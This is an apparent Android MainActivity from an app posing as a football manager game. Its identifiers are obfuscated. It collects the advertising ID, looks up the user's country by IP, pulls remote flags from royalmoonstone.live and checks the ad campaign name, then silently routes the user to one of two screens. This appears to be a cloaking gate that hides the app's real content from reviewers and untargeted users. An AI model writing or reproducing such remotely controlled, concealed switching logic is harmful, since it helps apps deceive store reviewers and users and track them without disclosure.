package com.perfect.eleven.football.manager.to

import android.content.Intent
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.util.Log
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.orhanobut.hawk.Hawk
import com.perfect.eleven.football.manager.to.databinding.ActivityMainBinding
import com.perfect.eleven.football.manager.to.ygdg.Jhxbxgsd
import com.perfect.eleven.football.manager.to.ygdg.Jnxihsazax
import com.perfect.eleven.football.manager.to.ygdg.Uisjdx
import com.perfect.eleven.football.manager.to.ygdg.Yukxok.Companion.xklxlzc
import com.perfect.eleven.football.manager.to.ygdg.Yukxok.Companion.rstast
import com.perfect.eleven.football.manager.to.ygdg.Yukxok.Companion.lsopxzkc
import com.perfect.eleven.football.manager.to.ygdg.Yukxok.Companion.qowkoaskmoa
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.Job
import kotlinx.coroutines.launch
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {
    lateinit var idocjx: ActivityMainBinding

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)


        idocjx = ActivityMainBinding.inflate(layoutInflater)
        setContentView(idocjx.root)
        GlobalScope.launch(Dispatchers.IO) {
            qopslmc
        }

        AppsFlyerLib.getInstance()
            .init("4Y53mPkeJGJHxSDgcoRVeL", uieodpskf, applicationContext)
        AppsFlyerLib.getInstance().start(this)

    }

    private fun aoppskkosa(){
        val wpsol = AdvertisingIdClient(applicationContext)
        wpsol.start()
        val bjnvc = wpsol.info.id
        Log.d("getAdvertisingId = ", bjnvc.toString())
        Hawk.put(xklxlzc, bjnvc)
    }

    private suspend fun ygucxvds(): String? {
        val retrofitBuilder = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://pro.ip-api.com/")
            .build()
            .create(Jnxihsazax::class.java)

        val fduiaosa = retrofitBuilder.ysuiax().body()?.usiosod
        Log.d("Data", "countryCode: $fduiaosa ")
        return fduiaosa

    }


    private val uieodpskf = object : AppsFlyerConversionListener {
        override fun onConversionDataSuccess(fidosood: MutableMap<String, Any>?) {
            val xjicxo = fidosood?.get("campaign").toString()
            Hawk.put(rstast, xjicxo)
        }

        override fun onConversionDataFail(p0: String?) {
        }

        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {

        }

        override fun onAttributionFailure(p0: String?) {
        }
    }

    private suspend fun apolskd(): String? {
        val bhuisds = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://royalmoonstone.live/")
            .build()
            .create(Jnxihsazax::class.java)

        val qpolxzmmmcnsja = bhuisds.bhjcxoo().body()?.opsdso
        Log.d("Data", "getDataDev: $qpolxzmmmcnsja")
        val nbjooovc = bhuisds.bhjcxoo().body()?.ftysuud
        Hawk.put(lsopxzkc, nbjooovc)
        Hawk.put(qowkoaskmoa, qpolxzmmmcnsja)
        Log.d("Data in Hawk", "getDataDev: ${Hawk.get(qowkoaskmoa, "null")}")
        Log.d("Data in Hawk", "getDataDev: ${Hawk.get(lsopxzkc, "null")}")
        val tysuai = bhuisds.bhjcxoo().body()?.vjcx
        Log.d("Data", tysuai.toString())
        return tysuai
    }


    private val qopslmc: Job = GlobalScope.launch(Dispatchers.IO) {
        val fyudis: String = ygucxvds().toString()
        val zxopsdas = apolskd().toString()
        val werpds = Hawk.get(lsopxzkc, "null")
        var guiicv: String? = Hawk.get(rstast)

        aoppskkosa()
        if (werpds == "1") {
            val kovco = Executors.newSingleThreadScheduledExecutor()
            kovco.scheduleAtFixedRate({
                if (guiicv != null) {
                    Log.d("TestInUIHawk", guiicv.toString())
                    if (guiicv!!.contains("tdb2") || zxopsdas.contains(fyudis)) {
                        Log.d("Apps Checker", "naming: $guiicv")
                        kovco.shutdown()
                        startActivity(Intent(this@MainActivity, Jhxbxgsd::class.java))
                        finish()
                    } else {
                        kovco.shutdown()
                        startActivity(Intent(this@MainActivity, Uisjdx::class.java))
                        finish()
                    }
                } else {
                    guiicv =  Hawk.get(rstast)
                    Log.d("TestInUIHawk", "Received null $guiicv")
                }

            }, 0, 2, TimeUnit.SECONDS)
        }
        else if (zxopsdas.contains(fyudis)) {
            startActivity(Intent(this@MainActivity, Jhxbxgsd::class.java))
            finish()
        } else {
            startActivity(Intent(this@MainActivity, Uisjdx::class.java))
            finish()
        }
    }



}